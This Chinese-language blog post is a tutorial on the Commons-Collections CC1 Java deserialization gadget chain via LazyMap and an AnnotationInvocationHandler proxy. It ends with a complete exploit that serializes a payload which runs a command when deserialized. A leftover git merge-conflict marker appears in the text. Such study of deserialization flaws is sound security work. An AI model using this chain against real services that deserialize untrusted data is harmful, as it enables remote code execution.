---
title: Commons-Collections篇02-CC1链-2
date: 2025-9-25 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---



# 调用链

![image-20250925175604377](Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925175604377.png)

# 初步构造-寻找transform

还是从`transform`出发，这次找的是`LazyMap`类，`LazyMap`类的get方法中有调用`transform`

给`factory`赋值`invokeTransformer`，并且给`key`赋值`Runtime`，就可以命令执行

![image-20250925150603061](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925150603061.png)

`factory`可以通过构造函数来定义，构造函数可以通过`decorate`方法来实现

![image-20250925150625884](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925150625884.png)

- `LazyMap`没有无参构造，有参构造是`protected`类型，所以要用到反射，拿到`LazyMap`类，再去调用下面的方法
- 构造函数有两个参数，一个是`map`类型，一个是`Transformer`类型的`factory`，后面get函数 用到的就是`factory`执行`transform`——`this.factory.transform(key);`
- 所以在使用`decorate方法`进行有参构造时，将`invokeTransformer`赋值给`factory`
- 最后再使用`get`方法传入`Runtime`对象

```java
public class CC2 {
    public static void main(String[] args) throws Exception{
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"});
        invokerTransformer.transform(runtime);

       Class<LazyMap> c = LazyMap.class;
       HashMap<Object,Object> hashMap = new HashMap<>();
       Map decoratemap =  LazyMap.decorate(hashMap,invokerTransformer);
       Method LazyMapget = c.getDeclaredMethod("get",Object.class);
       LazyMapget.setAccessible(true);
       LazyMapget.invoke(decoratemap,runtime);
    }
}
```

# 第二步-寻找get

上面这条链可以成功命令执行，那么接下来就是要找`get`方法

`AnnotationInvocationHandler`下的`invoke`方法中有`get`方法，并且这个类下还有`readObject()`，可以当做入口类

![image-20250925154533123](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925154533123.png)

`get`方法是通过`MemberValues`进行调用的,`MemberValues`是通过构造函数给其赋值

构造函数没有类型就是default类型，要通过反射来调用

![image-20250925164551320](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925164551320.png)

```java
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
     Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
     declaredConstructor.setAccessible(true);
     InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);
```

# 通过proxy动态生成代理类

解释一下上面代码最后一行，这也是我当时看代码时的疑惑：

> proxy动态生成代理类时，最后一个参数要求是`InvocationHandler`类型，有人可能会问为什么不直接用`AnnotationInvocationHandler`，`AnnotationInvocationHandler`就是实现了`InvocationHandler`这个接口，为什么还要强转重新创建一个变量，尝试一下就可以知道，会报错，因为不是public，无法从外部访问

![image-20250925172317510](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925172317510.png)

该类实现了`InvocationHandler`这个接口，是一个动态代理类，想调用`invoke()`方法，只需要调用被代理对象的任意方法

这里需要学习一下动态代理

[12、动态代理详解_哔哩哔哩_bilibili](./https://www.bilibili.com/video/BV1mc411h719/?p=11&spm_id_from=333.1007.top_right_bar_window_history.content.click)

使用`proxy`动态生成一个代理类，调用代理类的任意方法时就会调用`invoke`方法

```
Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);
```

而且`invoke`方法中还进行了判断，要绕过判断才能走到`get`方法，不能用`equals\toString\hashCode\annotationType`方法

![image-20250925173222757](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925173222757.png)

我们在CC链1中用到的`ReadObject`方法，其中的`memberValues`调用的`entrySet`方法也可以绕过上面的判断，只需要让`memberValues`成为动态代理类就可以了

还是和上面一样，通过反射给`memberValues`赋值

![image-20250925173454514](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925173454514.png)

```java
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
     Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
     declaredConstructor.setAccessible(true);
     InvocationHandler membervalues = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);
```

最终流程就是：

反序列化时调用`readObject`，然后执行其中的`MemberValues.entryset`，`MemberValues`又是我们动态定义的代理类，就会执行`invoke`方法去执行其中的`get`方法，执行get方法时我们又将`MemberValues`赋值为`LazyMap`通过`decorate`方法进行实例化过的`decorateMap`，最终执行的就是`LazyMap`的`get`方法，`LazyMap`的`get`方法下又执行了`factory.transform`，`factory`我们已经通过`decorate`方法来调用构造函数赋值为`InvokerTransformer`,最终就会执行`InvokerTransformer.transform`,该方法又可以任意命令执行


<<<<<<< HEAD
=======
![image-20250925175604377](./Commons-Collections%E7%AF%8702-CC1%E9%93%BE-2/image-20250925175604377.png)
>>>>>>> 4283b47aa81cb2f20c10f726cb9fa12fbfafc886

# 完整代码

```java
package org.example;

import com.sun.net.httpserver.Filter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC2 {
    public static void main(String[] args) throws Exception{
       Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
             new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
             new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
             new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"notepad.exe"})
       };
     ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
     HashMap<Object, Object> hashMap = new HashMap<>();
     Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

     Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
     Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
     declaredConstructor.setAccessible(true);
     InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);

     Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);
     InvocationHandler membervalues = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);


     serialize(membervalues);
     unserialize("ser.bin");
    }
    public static void serialize(Object object) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("test.txt"));
        oos.writeObject(object);
    }
    public static void unserialize(Object object) throws Exception{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream("test.txt"));
        ois.readObject();
    }
}

```

